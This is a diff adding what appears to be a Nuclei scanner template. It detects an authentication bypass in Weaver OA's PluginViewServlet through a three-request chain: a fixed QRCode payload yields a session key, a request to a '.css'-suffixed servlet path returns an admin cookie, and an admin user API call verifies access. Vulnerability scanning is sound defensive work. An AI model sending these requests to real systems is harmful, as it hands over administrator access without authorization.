@@ -1,0 +1,69 @@
+id: weaver-oa-pluginviewservlet-auth-bypass
+info:
+  name: Weaver OA PluginViewServlet Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver OA PluginViewServlet contains an authentication bypass vulnerability that allows attackers to log in and obtain administrator privileges.
+  reference:
+    - https://www.weaver.com.cn/
+  tags: permission-bypass
+
+variables:
+  data_value: "from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: retrieve-session-key
+    raw:
+      - |
+        POST /mobilemode/public.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{data_value}}
+    matchers:
+      - type: regex
+        regex:
+          - 'var _sessionkey = "(.*?)";'
+    extractors:
+      - type: regex
+        name: sessionkey
+        regex:
+          - 'var _sessionkey = "(.*?)";'
+        group: 1
+        internal: true
+
+  - id: pluginviewservlet-authentication
+    raw:
+      - |
+        POST /weaver/weaver.mobile.plugin.ecology.service.PluginViewServlet/.css HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sessionkey={{sessionkey}}
+    extractors:
+      - type: kval
+        kval:
+          - Cookie
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-admin-access
+    raw:
+      - |
+        GET /api/hrm/usericon/getUserIcon?userId=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{Cookie}}
+    matchers:
+      - type: word
+        words:
+          - '{"headformat":'
+      - type: status
+        status:
+          - 200
